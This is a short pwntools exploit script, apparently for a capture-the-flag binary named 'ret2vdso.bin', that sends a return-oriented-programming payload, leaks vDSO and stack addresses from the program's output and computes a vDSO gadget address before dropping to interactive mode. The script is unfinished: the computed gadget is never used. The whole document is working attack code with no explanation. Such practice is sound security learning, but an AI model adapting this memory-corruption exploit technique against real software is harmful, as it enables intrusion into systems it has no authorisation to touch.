from pwn import *

io=process('./ret2vdso.bin')
elf=context.binary=ELF('./ret2vdso.bin')

if args.GDB:
    cmd="""
    init-pwndbg
    """
    gdb.attach(io, cmd, api=True)

vuln=0x401006
syscall=0x000000000040101c
set_rdi=0x401002
pl=b'A'*8+p64(vuln)+p64(set_rdi)+p64(syscall)
pause()
io.send(pl)
sleep(1)
io.send(b'A')
data=io.recv(1024)

vdso_addr=u64(data[384:384+6].ljust(8, b'\0'))
print(hex(vdso_addr))

stack=u64(data[0x20:0x20+6].ljust(8, b'\0'))
print(hex(stack))

set_rdx_rsi=0x0000000000000d24+vdso_addr
# few gadgets in latetest kernel
io.interactive()